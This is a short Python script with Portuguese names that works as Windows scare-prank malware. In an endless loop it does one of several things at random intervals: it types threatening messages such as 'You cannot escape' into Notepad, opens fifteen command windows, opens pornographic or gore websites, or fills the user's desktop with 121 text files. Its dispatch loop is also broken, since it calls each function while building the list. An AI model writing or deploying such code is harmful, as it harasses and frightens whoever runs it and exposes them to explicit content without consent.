#sistema
import os
import pyautogui

#adicional
from time import sleep
from random import randint
import getpass


nome_pc = getpass.getuser()


class Metodos:
    def __init__(self) -> None:
        pass

    def notepad():
        tup_frases = (
            "Seu historico de navegação e bastante diversificado",
            "Seu e-mail está cheio de mensagens nao lidas.",
            "Interessante, voce passa muito tempo nesses sites.",
            "Voce realmente precisa atualizar seu antivirus.",
            "Sua senha pode ser mais forte",
            "Tem certeza que você esta sozinho?",
            "Olhe para tras.",
            "voce tem medo da morte ?",
            "O diabo a quem ?",
            "Nao pode escapar.",
        )
        frases = randint(0, len(tup_frases) - 1)

        os.startfile("notepad.exe")
        sleep(1)
        for l in tup_frases[frases]:
            pyautogui.write(l)
            sleep(0.1)

    def cmd():
        for c in range(0, 15):
            os.startfile("cmd.exe")

    def pesquisa():
        import webbrowser

        try:
            tup_pesquisa = (
                "opentopia.com",
                "sobrenatural.org",
                "takethislollipop.com",
                "cryptomundo.com",
                "creepypastabrasil.com.br",
                "deathdate.info",
                "joyofsatan.org",
                "crazyshit.com",
                "xvideos.com",
                "https://pt.pornhub.com/",
                "Theync",
                "http://jimpunk.com/",
                "https://planecrashinfo.com/",
                "https://thisxdoesnotexist.com/",
            )
            frases = randint(0, len(tup_pesquisa) - 1)

            webbrowser.open(tup_pesquisa[frases])
        except:
            pass

    def arquivos_texto():
        local = f'C:/Users/{nome_pc}/OneDrive/Área de Trabalho'
        for c in range(0, 120+1):
            arquivo_nome = f'Documento Imporante{c}.txt'
            file_path = os.path.join(local, arquivo_nome)
            with open(file_path, 'w') as file:
                file.write("Você não pode fugir.")



    def iniciar():
        while True:
            tempo = randint(0, 120)
            sleep(tempo)
            lista = [Metodos.pesquisa(), Metodos.cmd(), Metodos.notepad(), Metodos.arquivos_texto()]
            funcao = lista[randint(0, len(lista) - 1)]
            funcao()


Metodos.iniciar()